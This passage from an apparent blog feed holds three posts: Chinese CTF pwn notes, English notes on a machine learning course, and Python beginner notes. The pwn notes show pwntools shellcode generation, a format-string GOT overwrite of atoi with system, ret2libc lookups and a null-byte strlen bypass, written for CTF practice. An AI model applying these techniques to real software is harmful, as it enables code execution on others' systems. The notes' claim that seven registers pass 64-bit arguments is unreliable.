string（新手区）</h3><p>此题有几点需要注意，首先是这个样子的代码，是可以考虑传入shellcode直接执行</p><blockquote><p>((void (__fastcall*)(_QWORD))v1)(0LL)</p></blockquote><p>此行会将v1转化为代码执行，使用</p><figure class="highlight moonscript"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,arch = <span class="hljs-string">&#x27;i386&#x27;</span>, <span class="hljs-built_in">os</span> = <span class="hljs-string">&#x27;linux&#x27;</span><br>shellcode = asm(shellcraft.sh())<br></code></pre></td></tr></table></figure><p>得到shellcode机器码。</p><p>再者就是灵活运用printf(format)这样的漏洞<br>如本题中，需要泄露v3的地址，且此地址就在漏洞printf不远处，就不要用AAAA-%p….的形式去泄露AAAA所存储的地址了，而是直接找v3对应内存的值，在输入%p….后对应偏移量为多少</p><h3 id="记录一个新方法"><a href="#记录一个新方法" class="headerlink" title="记录一个新方法"></a>记录一个新方法</h3><p>修改地址法<br>用到pwn里的fmtstr_payload(offset,{被替换的：替换为})<br>这个语法<br>如将atoi的got地址改为system的plt地址，可以写为<br>payload = fmtstr_payload(offset,{atoi_got : system_plt})即可利用格式化字符串修改地址</p><h1 id="0x02-ROP"><a href="#0x02-ROP" class="headerlink" title="0x02 ROP"></a>0x02 ROP</h1><h2 id="寄存器传参顺序"><a href="#寄存器传参顺序" class="headerlink" title="寄存器传参顺序"></a>寄存器传参顺序</h2><p>64位系统中，函数传参进入寄存器<br>而32位是先入栈再传入数据。<br>64位的传参顺序：前7个参数，从左至右依次传入rdi，rsi，rdx，rcx，r8，r9，r15.</p><h2 id="简单ROP"><a href="#简单ROP" class="headerlink" title="简单ROP"></a>简单ROP</h2><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>若题目没给libc版本，需要用LibcSearch来做，其中格式为libc.dump(‘system’)<br>如果给了libc版本，可以这样<br>libc = ELF(‘./libc-2.xx.so’)这样子<br>搜索/bin/sh字符串所在位置时，有如下语法：<br>next(libc.search(b’/bin/sh’))可以获取binsh的地址</p><h3 id="关于strlen-检测的绕过"><a href="#关于strlen-检测的绕过" class="headerlink" title="关于strlen()检测的绕过"></a>关于strlen()检测的绕过</h3><p>read函数读至’\n’结束<br>strlen读至’\x00’结束<br>在32位里面，char数组读入时：read(0,buf,10u)，就读入十个char，而’\x00’是一个char<br>故遇到检查strlen来进行阻碍时，可以在字符串前面输入’\x00’开头，来规避之。</p><h3 id="关于构造好ROP以后，接收got表地址时的注意事项"><a href="#关于构造好ROP以后，接收got表地址时的注意事项" class="headerlink" title="关于构造好ROP以后，接收got表地址时的注意事项"></a>关于构造好ROP以后，接收got表地址时的注意事项</h3><p>1.32位系统下，got表地址是4byte，用p.recv(4);u32(write)来收取<br>2.64位系统下，got表地址位8byte，需要进行相当的调整。</p><h1 id="0x03-堆heap"><a href="#0x03-堆heap" class="headerlink" title="0x03 堆heap"></a>0x03 堆heap</h1><p>引用经典内存布局</p><p><img src="/2022/05/23/%E5%9B%BD%E8%B5%9B/p2.jpg"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Machine Learning</title>
    <link href="/2022/03/28/Machine-Learning/"/>
    <url>/2022/03/28/Machine-Learning/</url>
    
    <content type="html"><![CDATA[<h1 id="Basic-Machine-Learning"><a href="#Basic-Machine-Learning" class="headerlink" title="Basic Machine Learning"></a>Basic Machine Learning</h1><p>This blog is based on <a href="https://www.coursera.org/learn/machine-learning">Machine Learning</a> on coursera taughted by Andrew Ng.</p><h2 id="0x01-Welcome-to-Machine-Learning"><a href="#0x01-Welcome-to-Machine-Learning" class="headerlink" title="0x01 Welcome to Machine Learning"></a>0x01 Welcome to Machine Learning</h2><h3 id="What-is-Supervised-Learning"><a href="#What-is-Supervised-Learning" class="headerlink" title="What is Supervised Learning"></a>What is Supervised Learning</h3><p>Try to imagine that you’ve got some datas of the house price, but the datas you have were separated points, and you want to know how much your house are worthy. You need to fit a curve for sake that you can get an approximate price of your house.<br>When you print your datas into the computer, they are one kind of “<strong>correct answers</strong>“, and that is one of the treats of <strong>Supervised Learning</strong>.</p><p>And there are two modes of Supervised Learning:</p><ol><li>Regression<br>We are supposed to predict results within a continues output, meaning that we are trying to map input variables to some continuous function.</li><li>Classfication<br>We are instead trying to predict results in a discrete output. In other words, we are trying to map the variables into discrete categories.</li></ol><h3 id="Unsupervised-Learning"><a href="#Unsupervised-Learning" class="headerlink" title="Unsupervised Learning"></a>Unsupervised Learning</h3><p>Compareed to Supervised Learning, Unsupervised Learning fucos on separate the datas into several categories. Such as classification of the news, and tell certain groups of plenty of cells.<br>I regard Unsupervised Learning as a method to classify datasets, but not to tell whether it is false or true, negative or positive.<br>We can derive structure from data where we don’t necessarily know the effect of the variables.<br>So, we just need to tell which category each date should belongs to.<br><strong>Example</strong>:</p><p>Clustering: Take a collection of 1,000,000 different genes, and find a way to automatically group these genes into groups that are somehow similar or related by different variables, such as lifespan, location, roles, and so on.</p><h2 id="0x02-Model-and-Cost-Function"><a href="#0x02-Model-and-Cost-Function" class="headerlink" title="0x02 Model and Cost Function"></a>0x02 Model and Cost Function</h2><h3 id="Model-Representation"><a href="#Model-Representation" class="headerlink" title="Model Representation"></a>Model Representation</h3><p>we’ll use x^{(i)} to denote the “input” variables (living area in this example), also called input features, and y^{(i)} to denote the “output” or target variable that we are trying to predict (price).</p><p>the function we used to predict the result is called “hypothesis”(假设).</p><h3 id="Cost-Function"><a href="#Cost-Function" class="headerlink" title="Cost Function"></a>Cost Function</h3><p>We can measure the accuracy of our hypothesis function by using a cost function. This takes an average difference (actually a fancier version of an average) of all the results of the hypothesis with inputs from x’s and the actual output y’s.<br><img src="/2022/03/28/Machine-Learning/p1.png"></p><p><img src="/2022/03/28/Machine-Learning/p2"><br>In this image, h(x) is the function which passes through these scattered data points.<br>And J(θ) is the function describe the error h() made for each θ.</p><h2 id="0x03-Parameter-Learning"><a href="#0x03-Parameter-Learning" class="headerlink" title="0x03 Parameter Learning"></a>0x03 Parameter Learning</h2><h3 id="Gradient-Descent"><a href="#Gradient-Descent" class="headerlink" title="Gradient Descent"></a>Gradient Descent</h3><p>Gradient Descent are used in measuring which j(θ) means the best curve.<br>梯度下降<br><img src="/2022/03/28/Machine-Learning/p3.png" alt="Gradient Descent"></p><p>in this function, α is called the learning rate, it decided how long one step you can take.<br><img src="/2022/03/28/Machine-Learning/p4.png" alt="we must ensure the simultaneously update"><br><img src="/2022/03/28/Machine-Learning/p5.png"><br>we can find that in most times whatever α you choose, the step you take will be smaller and smaller.</p><p><img src="/2022/03/28/Machine-Learning/p6.png" alt="Congratulations"></p><p>Congratulations! The first Machine Learning algorithm we got is Gradient Descent. It is an excellent algorithm for us to calculate the Local Optima.</p><h3 id="Gradient-Descent-For-Multiple-Variables"><a href="#Gradient-Descent-For-Multiple-Variables" class="headerlink" title="Gradient Descent For Multiple Variables"></a>Gradient Descent For Multiple Variables</h3><p>When we have to deal with Multiple Variables, there are several θ(j) waiting for us to calculate.<br>We can use those functions to make it.<br><img src="/2022/03/28/Machine-Learning/p7.png"><br>可以看出，求各个θ值对应的下降值时，其对应的公式就是对它求偏导。  </p><h3 id="Feature-Scaling-to-make-the-Gradient-Descent-faster"><a href="#Feature-Scaling-to-make-the-Gradient-Descent-faster" class="headerlink" title="Feature Scaling to make the Gradient Descent faster"></a>Feature Scaling to make the Gradient Descent faster</h3><p>We are supposed to replace x(i) as (x(i) - μ(i))/s(i)<br>μ(i) is equal to the avg of x(i), and s(i) is equal to the range(max - min) of x(i).<br><img src="/2022/03/28/Machine-Learning/p8.png" alt="放缩法"></p><h3 id="The-Learning-Rate-α"><a href="#The-Learning-Rate-α" class="headerlink" title="The Learning Rate α"></a>The Learning Rate α</h3><p> If α is too small: slow convergence. </p><p> If α is too large:may not decrease on every iteration and thus may not converge.</p><h3 id="Features-and-Polynomial-Regression"><a href="#Features-and-Polynomial-Regression" class="headerlink" title="Features and Polynomial Regression"></a>Features and Polynomial Regression</h3><p>We are supposed to find some model fitted the function better.<br><img src="/2022/03/28/Machine-Learning/p9.png"></p><p><strong>we can use all three methods there to make our algorithm better</strong></p><h2 id="0x04-Normal-Equation"><a href="#0x04-Normal-Equation" class="headerlink" title="0x04 Normal Equation"></a>0x04 Normal Equation</h2><p>Here, we have another method to measure the value of θ that makes J(θ) the min.<br><img src="/2022/03/28/Machine-Learning/p10.png" alt="Nromal Equation"></p><p>For in this function, we can calculate the calue of θ directly.<br>But the cost of time is about T(n) = O(n^3)<br>So, if m &lt; 10^6, we consider to use Normal Equation<br>and if m is too large, the Gradient Descent is better for us.<br><img src="/2022/03/28/Machine-Learning/p11.png" alt="Adventages and shortages"></p><p>But when XTX turns to be noninvertible(不可逆的):<br>  Redundant features, where two features are very closely related (i.e. they are linearly dependent)</p><p>  Too many features (e.g. m ≤ n). In this case, delete some features or use “regularization” (to be explained in a later lesson).</p>]]></content>
    
    
    
    <tags>
      
      <tag>M_L</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python noob</title>
    <link href="/2022/03/23/Python-noob/"/>
    <url>/2022/03/23/Python-noob/</url>
    
    <content type="html"><![CDATA[<h1 id="Python-学习之路"><a href="#Python-学习之路" class="headerlink" title="Python 学习之路"></a>Python 学习之路</h1><p>笔者有C++基础，但在Python上还是noob一只。</p><h2 id="0x00-Python3-初见"><a href="#0x00-Python3-初见" class="headerlink" title="0x00 Python3 初见"></a>0x00 Python3 初见</h2><h3 id="Python是一种解释型语言"><a href="#Python是一种解释型语言" class="headerlink" title="Python是一种解释型语言"></a>Python是一种解释型语言</h3><p>与C语言对比，Python无需编译，而是执行时，通过解释器一行一行地进行解释。  </p><h3 id="Python是面向对象的语言"><a href="#Python是面向对象的语言" class="headerlink" title="Python是面向对象的语言"></a>Python是面向对象的语言</h3><p>与C++一样。  </p><h3 id="可拓展性"><a href="#可拓展性" class="headerlink" title="可拓展性"></a>可拓展性</h3><blockquote><p>如果你需要一段运行很快的关键代码，或者是想要编写一些不愿开放的算法，你可以使用C或C++完成那部分程序，然后从你的Python程序中调用。  </p></blockquote><h3 id="可嵌入性"><a href="#可嵌入性" class="headerlink" title="可嵌入性"></a>可嵌入性</h3><blockquote><p>你可以将Python嵌入到C/C++程序，让你的程序的用户获得”脚本化”的能力。</p></blockquote><h3 id="速度性能"><a href="#速度性能" class="headerlink" title="速度性能"></a>速度性能</h3><blockquote><p>若想程序运行得更快，用C++改写关键部分</p></blockquote><h2 id="0x01-Python3-环境配置"><a href="#0x01-Python3-环境配置" class="headerlink" title="0x01 Python3 环境配置"></a>0x01 Python3 环境配置</h2><h3 id="安装Python环境"><a href="#安装Python环境" class="headerlink" title="安装Python环境"></a>安装Python环境</h3><blockquote><p><a href="https://www.python.org/downloads/windows/">https://www.python.org/downloads/windows/</a><br>下载Download Windows installer (64-bit)<br>记得勾选add path选项。</p></blockquote><h3 id="Pycharm-运行Python"><a href="#Pycharm-运行Python" class="headerlink" title="Pycharm 运行Python"></a>Pycharm 运行Python</h3><blockquote><p><a href="https://www.jetbrains.com/pycharm/download/">https://www.jetbrains.com/pycharm/download/</a><br>下载Pycharm</p></blockquote><h2 id="0x02-Python3-基础语法"><a href="#0x02-Python3-基础语法" class="headerlink" title="0x02 Python3 基础语法"></a>0x02 Python3 基础语法</h2><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><p>默认utf-8编码，unicode字符串。</p><h3 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h3><p><strong>第一个字符不能是数字，只能是字母表中字母或下划线_</strong><br>其余与C++相同。</p><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>以#开头，如</p><blockquote><p>#this is my file</p></blockquote><p>也可以用”””或’’’</p><blockquote><p>‘’’<br>注释<br>注释<br>‘’’</p><p>“””<br>注释<br>注释<br>“””</p></blockquote><h3 id="行与缩进"><a href="#行与缩进" class="headerlink" title="行与缩进"></a>行与缩进</h3><p>python最具特色的就是用缩进表示代码块，不要用大括号{}<br>缩进空格数可变，但同一个代码块必须包含相同的缩进空格数。</p><blockquote><p>if True:<br>          print(“true”)<br>          print(“1111”)<br>else:<br>          print(“false”)</p><p>#the following part will not be allowed<br>if True:<br>          print(“111”)<br>          print(“not allowed”)</p></blockquote><h3 id="多行语句"><a href="#多行语句" class="headerlink" title="多行语句"></a>多行语句</h3><p>Python可以用\实现多行语句</p><blockquote><p>total = item_one + <br>               item_two + <br>               item_three</p><p>在[], {} , ()中的多行语句，不需要\ 如：<br>total = {‘it’,’it3’<br>     ‘it2’}</p></blockquote><h3 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h3><p>Python中有四种类型：整形，bool，float，复数。</p><blockquote><p>int (整数), 如 1, 只有一种整数类型 int，表示为长整型，没有 python2 中的 Long。<br>bool (布尔), 如 True。<br>float (浮点数), 如 1.23、3E-2<br>complex (复数), 如 1 + 2j、 1.1 + 2.2j</p></blockquote><p>注：float型中，如1.23，3E-2.<br>3E-2是3*10的负二次方的意思。</p><h3 id="String"><a href="#String" class="headerlink" title="String"></a>String</h3><p>** Python中单引号<code>&#39;&#39;</code>与双引号<code>&quot;&quot;</code>的使用完全相同</p><p>转义符<code>\</code>.<br>使用r让反斜杠不转义。如 <strong>r”this is line of words\n”</strong> 此时<code>\n</code>会显示，而非换行。</p><p>字符串可用<code>+</code>链接，用<code>*</code>重复数次。<br>Python中字符串有两种索引方式，从左往右以<code>0</code>开始，从右往左以<code>-1</code>开始。<br>Python 中的字符串不能改变。<br>Python 没有单独的字符类型，一个字符就是长度为 1 的字符串。<br>字符串的截取的语法格式如下：<strong>变量[头下标:尾下标:步长]</strong><br><strong>关于Python字符串的下标，跟C++有出入</strong></p><blockquote><p>a= “123456”<br>print(a[0:1])<br>#会打印1<br>print(a[0:0])<br>#什么都不会打印出来</p></blockquote><h3 id="等待用户输入"><a href="#等待用户输入" class="headerlink" title="等待用户输入"></a>等待用户输入</h3><p>执行下面程序，会在回车键后等待用户输入</p><blockquote><p>input(“按下 enter 键后退出”)</p></blockquote><h3 id="同一行显示多条语句"><a href="#同一行显示多条语句" class="headerlink" title="同一行显示多条语句"></a>同一行显示多条语句</h3><p>语句间用<code>;</code>分割。</p><blockquote><p>import sys; x = ‘runoob’; sys.stdout.write(x + ‘\n’)</p></blockquote><h3 id="代码组"><a href="#代码组" class="headerlink" title="代码组"></a>代码组</h3><p>缩进相同的一组语句构成一个代码块，称之为代码组。<br>如if，while，def这种复合语句，首行以<code>:</code>结束，此行开始后的一行或多行构成代码组。</p><h3 id="print输出"><a href="#print输出" class="headerlink" title="print输出"></a>print输出</h3><p><strong>print</strong>输出是默认换行的，若要禁止换行，需要在print第二个参数写上<code>end = &quot;&quot;</code></p><blockquote><p>x= “a”<br>y = “b”<br>#换行<br>print(x)<br>#不换行<br>print(y,end = “”)<br>print()</p></blockquote><h3 id="import-与-from-import"><a href="#import-与-from-import" class="headerlink" title="import 与 from  import"></a>import 与 from  import</h3><p>导入整个模块，格式为：import somemodule<br>导入某模块中全部函数：from pwn import*<br>（导入pwntools的所有函数）<br>从模块中导入函数：from somemodule import func1，func2</p><h2 id="0x03-Python3-基本数据类型"><a href="#0x03-Python3-基本数据类型" class="headerlink" title="0x03 Python3 基本数据类型"></a>0x03 Python3 基本数据类型</h2><p>python中变量不需要声明类型（与C++不同）<br><del>所以</del>每个变量使用前都必须赋值，才能创建。<br><code>=</code>为赋值号，如<code>a = 1</code>就是给变量a赋值为1，a是整型变量。</p><h3 id="多变量赋值"><a href="#多变量赋值" class="headerlink" title="多变量赋值"></a>多变量赋值</h3><p>规则：从后向前。<br>如</p><blockquote><p>a = b = c = 1</p></blockquote><p>就是c先被赋值为1，再b、a。  </p><p>也可以对应式多变量赋值。</p><blockquote><p>a, b, c = 1, 2, “new booob”</p></blockquote><p>就是a = 1;b = 2; c = “new booob”的效果。  </p><h3 id="标准数据类型"><a href="#标准数据类型" class="headerlink" title="标准数据类型"></a>标准数据类型</h3><p>Python3 中有六个标准数据类型：</p><ol><li>Number（数字）</li><li>String （字符串）</li><li>List （列表）</li><li>Tuple（元组）</li><li>Set（集合）</li><li>Dictionary（字典）</li></ol><p>Python3的六个标准数据类型中：<br>Number，String，Tuple   为不可变数据。<br>List，Dictionary，Set   为可变数据。</p><h3 id="Number详解"><a href="#Number详解" class="headerlink" title="Number详解"></a>Number详解</h3><p><strong>int,float,bool,complex.</strong><br>注：内置type()函数可以查询变量所指对象类型</p><blockquote><p>&gt;&gt;&gt; a, b, c, d = 20, 5.5, True, 4+3j<br>&gt;&gt;&gt; print(type(a), type(b), type(c), type(d))<br>&lt;class ‘int’&gt; &lt;class ‘float’&gt; &lt;class ‘bool’&gt; &lt;class ‘complex’&gt;</p></blockquote><p>注：<code>//</code>双除号会得到一个整数（仅仅保留整数部分，如1.9保留为1）<br>一个变量可以通过赋值指向不同类型的对象。<br>混合计算时，Python会将整型转化为浮点数。</p><h3 id="String字符串"><a href="#String字符串" class="headerlink" title="String字符串"></a>String字符串</h3><p>截取：</p><blockquote><p>变量[头下标:尾下标]</p></blockquote><p><img src="/2022/03/23/Python-noob/p1.svg"></p><p>可见，其与C++的索引模式有点区别，小心搞混力。<br><strong>与C字符串不同的是，Python字符串不能被改变。对一个索引位置赋值是错误的！！</strong><br><strong>w[0]就会报错</strong></p><p>总结：<br>1、反斜杠可以用来转义，使用r可以让反斜杠不发生转义。<br>2、字符串可以用+运算符连接在一起，用*运算符重复。<br>3、Python中的字符串有两种索引方式，从左往右以0开始，从右往左以-1开始。<br>4、Python中的字符串不能改变。</p><h3 id="List-（列表）"><a href="#List-（列表）" class="headerlink" title="List （列表）"></a>List （列表）</h3><p>List（列表）是Python中使用最频繁的数据类型。<br>可以看作一个混合数组，其中各个元素类型可以互不相同。<br>创建方式</p><blockquote><p>list1 = [“a”, 100 , 12.5, b]</p><p>列表的截取语法与字符串相同：<br>变量[头下标:尾下标]     </p></blockquote><p><img src="/2022/03/23/Python-noob/p2"></p><blockquote><p>print(list1[0])     #输出列表第一个元素<br>print(list1[1:3])  #输出列表第2，3个元素<br>print(list1[1:])   #输出列表第二个元素开始的所有元素</p></blockquote><p>注：列表也是可以链接的。</p><p>与Python字符串不同，列表中元素可以改变</p><p><strong>索引的理解方式</strong>：<br>与C++一样的部分：从0号元素开始。<br>不同：左闭右开，即[start_index:end_index]中，start_index是取得到的，end_index是取不到的</p><p><strong>如[1:3]就是位置为1，第二个元素会取到，但位置为3，第四个元素不会取到，也就是对第2到3，这两个元素进行操作！！！</strong></p><p>总结：<br>1、List写在方括号之间，元素用逗号隔开。<br>2、和字符串一样，list可以被索引和切片。<br>3、List可以使用+操作符进行拼接。<br>4、List中的元素是可以改变的。</p><h3 id="Tuple-（元组）"><a href="#Tuple-（元组）" class="headerlink" title="Tuple （元组）"></a>Tuple （元组）</h3><p>元组与列表相似，不同之处在于元组的元素<strong>不能修改</strong>。<br>元组写在小括号<code>()</code>内，元素之间用逗号分割。</p><blockquote><p>tup = (1,2,3,4,5)#Tuple<br>list1 = [1,2,3,4,5]#List</p></blockquote><p>虽然tuple元素不可修改，但是它可以包含可变的对象，如list列表。<br><img src="/2022/03/23/Python-noob/p3.png" alt="可见，元组中list的元素可以被修改"><br>当构造包含0个或1个元素的元组时，有额外的语法规则：</p><blockquote><p>tup0 = ()<br>tup1 = (1,)#一个元素，要在元素后面打逗号</p></blockquote><p>string，list，tuple都属于sequence（序列）。</p><p>总结：</p><p>1、与字符串一样，元组的元素不能修改。<br>2、元组也可以被索引和切片，方法一样。<br>3、注意构造包含 0 或 1 个元素的元组的特殊语法规则。<br>4、元组也可以使用+操作符进行拼接。</p><h3 id="Set（集合）"><a href="#Set（集合）" class="headerlink" title="Set（集合）"></a>Set（集合）</h3><p>集合时由一个或数个形态各异的大小整体组成，构成集合的事物或对象，称为元素或成员。<br>可以使用大括号 <code>&#123;&#125;</code>或set()来创建集合。<br>注意：空集合必须用set()<br><code>parame = &#123;calue1, value2,....&#125; or set(value)</code><br>当输出集合时，会自动不输出重复的元素。<br>也可以测试集合中是否有某一元素。<br><code>sites = &#123;&quot;baidu&quot;,&quot;google&quot;&#125; if &quot;baidu&quot; in sites :         print(&quot;baidu is in sites&quot;) else :         print(&quot;baidu is not in sites&quot;)</code><br>set还能进行集合运算：<br><code>a = set(&#39;abracadabra&#39;) b = set(&#39;alacazam&#39;) print(a - b)  #a 和 b 的差集，a中有而b中无 print(a | b)  #a和b的并集 print(a &amp; b)  #a 和 b 的交集 print(a ^ b)   #a 和 b中不同时存在的元素（异或符号）</code></p><p><strong>只有a = set()格式才能进行集合运算，输出形式为一个字符一个字符地，而且去除了相同的字符。而a = {“google”,…}形式为括号内每一个元素之间进行运算。</strong></p><h3 id="Dictionary（字典）"><a href="#Dictionary（字典）" class="headerlink" title="Dictionary（字典）"></a>Dictionary（字典）</h3><p>字典是一个非常有用的内置数据类型。<br>字典是一种映射类型，它的元素是键(key)与值(value)对。<br><strong>同一个字典内，键(key)必须是唯一的。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">dict</span> = &#123;&#125; <span class="hljs-comment">#create an empty dictionary</span><br><span class="hljs-built_in">dict</span>[<span class="hljs-string">&#x27;one&#x27;</span>] = <span class="hljs-string">&quot;1-runoob&quot;</span>  <span class="hljs-comment">#bind &quot;1-runoob&quot;(value) to &#x27;one&#x27;(key)</span><br><span class="hljs-built_in">dict</span>[<span class="hljs-number">2</span>] = <span class="hljs-string">&quot;2-fc&quot;</span>  <span class="hljs-comment">#bind &quot;2-fc&quot; to 2 (in this dictionary called dict)</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">dict</span>[<span class="hljs-string">&#x27;one&#x27;</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">dict</span>[<span class="hljs-number">2</span>]) <br><br>tinydict = &#123;<span class="hljs-string">&quot;fc&quot;</span> : <span class="hljs-string">&quot;noob&quot;</span> , <span class="hljs-string">&quot;kawa&quot;</span> : <span class="hljs-string">&quot;pro&quot;</span>&#125;<br><span class="hljs-built_in">print</span>(tinydict) <span class="hljs-comment">#print all members in tinydict</span><br><span class="hljs-built_in">print</span>(tinydict.keys()) <span class="hljs-comment">#print all keys in tinydict</span><br><span class="hljs-built_in">print</span>(tinydict.values()) <span class="hljs-comment">#print all values in tinydict</span><br></code></pre></td></tr></table></figure><p>注意：当创造如上tinydict后，可以用<code>tinydict[&quot;xx&quot;] = &quot;xxx&quot;</code>的语法扩充字典。</p><p>1、字典是一种映射类型，它的元素是键值对。<br>2、字典的关键字必须为不可变类型，且不能重复。<br>3、创建空字典使用 { }。</p><h2 id="0x04-Python3-数据类型转换"><a href="#0x04-Python3-数据类型转换" class="headerlink" title="0x04 Python3 数据类型转换"></a>0x04 Python3 数据类型转换</h2><p>Python中数据类型转换可以分为两种：<br>1.隐式类型转换 — 自动完成<br>2.显式类型转换 — 需要用函数进行转换</p><h3 id="隐式类型转换"><a href="#隐式类型转换" class="headerlink" title="隐式类型转换"></a>隐式类型转换</h3><p>如int类型与float类型进行运算，python会自动将int类型数据升级为float类型，防止数据丢失。<br><strong>但是int，float无法自动与str类型自动转换。</strong><br><strong>此时需要强制类型转换</strong></p><h3 id="显式类型转换"><a href="#显式类型转换" class="headerlink" title="显式类型转换"></a>显式类型转换</h3><p>将目标数据类型作为函数名，进行转换，<strong>记得要用一个变量接受函数返回值</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">x = <span class="hljs-number">1</span><br>y = <span class="hljs-string">&quot;123&quot;</span><br>y = <span class="hljs-built_in">int</span>(y) <span class="hljs-comment">#switch y--str to y--int, y is 123(int) now</span><br><span class="hljs-built_in">print</span>(x+y) <span class="hljs-comment">#it will print 124 as result</span><br></code></pre></td></tr></table></figure><h2 id="0x05-Python3-推导式"><a href="#0x05-Python3-推导式" class="headerlink" title="0x05 Python3 推导式"></a>0x05 Python3 推导式</h2><p>推导式可以理解为，用循环的方式，予以一定的条件限制，快速建立一个新的List，Tuple，Set，Dictionary。</p><h3 id="List推导式"><a href="#List推导式" class="headerlink" title="List推导式"></a>List推导式</h3><p>先回忆一下List结构：<br>是一个可以存储各种数据类型的数组，用[]建立。</p><p>列表推导式格式为：</p><blockquote><p>[表达式 <strong>for</strong> 变量 <strong>in</strong> 列表]<br>[out_exp_res <strong>for</strong> out_exp <strong>in</strong> input_list]<br>[表达式 <strong>for</strong> 变量 <strong>in</strong> 列表 <strong>if</strong> condition]</p></blockquote><p>例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">names = [<span class="hljs-string">&quot;kawasan&quot;</span>,<span class="hljs-string">&quot;alice&quot;</span>,<span class="hljs-string">&quot;bob&quot;</span>,<span class="hljs-string">&quot;peter&quot;</span>]<br>new_names = [name <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> names <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(name) &gt; <span class="hljs-number">3</span>]<br><span class="hljs-built_in">print</span>(new_names)<br></code></pre></td></tr></table></figure><p>通过上面例子，可见，[]中：<br>第一个参数，是写入新List的数据，可以用函数返回值修饰<br>第二个参数是引用的变量名，自己命名，在本[]中有效（作用域为本括号，就是起名字的作用）<br>第三个参数为导入的List，也就是引入的源数据列表。<br>第四个为条件参数，满足条件则往新List中push第一个参数值。<br><strong>可见表达式十分的简洁，笔者认为这正是Python的魅力所在</strong></p><h3 id="字典推导式"><a href="#字典推导式" class="headerlink" title="字典推导式"></a>字典推导式</h3><p>复习一下字典这个数据类型的概念：<br>是一个映射型的数据类型，字典里面的元素是key与value的数据对。用大括号表示。<br>字典推导式的格式为：</p><blockquote><p>[key : value_expr for value in input if condition]</p></blockquote><p>注意：可以传入List类型</p><p><strong>关于遍历字典的方法</strong><br>默认情况下：</p><blockquote><p>for key in dict1</p></blockquote><p>是遍历字典的key值<br>如果想遍历字典的value：</p><blockquote><p>for value in dict1.values()</p></blockquote><p>如果想遍历字典的items</p><blockquote><p>for key,value in dict1.items()</p></blockquote><p><del>感谢{“daisan”:”pro”}的鼎力相助</del></p><h3 id="集合推导式"><a href="#集合推导式" class="headerlink" title="集合推导式"></a>集合推导式</h3><p>回忆一下集合的定义：<br>集合用大括号<code>&#123;&#125;</code>表示，集合与List相比，可以用set()方法进行集合运算。  </p><p>集合推导式如下：</p><blockquote><p>new_set = {new_it for new_it in former_set if condition}</p></blockquote><h3 id="元组推导式"><a href="#元组推导式" class="headerlink" title="元组推导式"></a>元组推导式</h3><p>元组：<br>不能修改元素值的列表，用小括号<code>()</code>表示</p><blockquote><p>new_tuple = (item for item in former_tuple if condition)</p></blockquote><p>至此，推导式列举得差不多了，稍稍总结一下：<br>推导式就是快速简单，用循环和条件创建一个新的数据结构的表达式。<br>注意符合目标数据结构的格式，灵活运用循环，就能写出来。</p><h2 id="0x06-Python3-解释器"><a href="#0x06-Python3-解释器" class="headerlink" title="0x06 Python3 解释器"></a>0x06 Python3 解释器</h2><h2 id="0x07-Python3-注释"><a href="#0x07-Python3-注释" class="headerlink" title="0x07 Python3 注释"></a>0x07 Python3 注释</h2><p>单行：用<code>#</code><br>多行：用<code>&#39;&#39;&#39;</code>或<code>&quot;&quot;&quot;</code>括起来。</p><h2 id="0x08-Python3-运算符"><a href="#0x08-Python3-运算符" class="headerlink" title="0x08 Python3 运算符"></a>0x08 Python3 运算符</h2><p>与C++不同部分：<br>1.<code>**</code>幂运算符，如2**2 = 4。<br>2.<code>//</code>除取整数部分运算符。<br>3.按位运算符，将数字先看作二进制，再进行计算。<br>&amp;：和运算符，同一位，都为1，&amp;值为1，否则为0<br>|：或运算符，同一位，有1则为1，否则为0<br>^：异或运算符，同0异1<br>~：取反，单操作数运算符，所有位取反。<br>&lt;&lt;：左移运算符：向左移动，高位丢弃，低位填0</p><blockquote><blockquote><p>：右移运算符：向右移动。</p></blockquote></blockquote><p>逻辑运算符：and，or，not<br>返回bool类型返回值。<br><strong>这里的逻辑十分有趣</strong><br>and：表达式：x and y  ：如果x为false，返回x值，否则返回y值<br>or ： 表达式 x or y ： 如果x为true，返回x值，否则返回y值<br>not就不用说了0.0</p><h3 id="Python-成员运算符"><a href="#Python-成员运算符" class="headerlink" title="Python 成员运算符"></a>Python 成员运算符</h3><p>in：如果在指定的sequence中找到了，返回true，没找到就是false。<br>not in：与in相反。</p><h3 id="Python-身份运算符"><a href="#Python-身份运算符" class="headerlink" title="Python 身份运算符"></a>Python 身份运算符</h3><p>is：x is y   ：类似id(x) == id(y),如果引用的是同一个对象返回True，反之为false。</p><p><strong>注</strong>：<br>id()函数用于获取对象内存地址。</p><h2 id="0x09-Python3-数字（Number）"><a href="#0x09-Python3-数字（Number）" class="headerlink" title="0x09 Python3 数字（Number）"></a>0x09 Python3 数字（Number）</h2><p>删除方式：del关键字。<br>部分数学函数：</p><blockquote><p>abs(x) 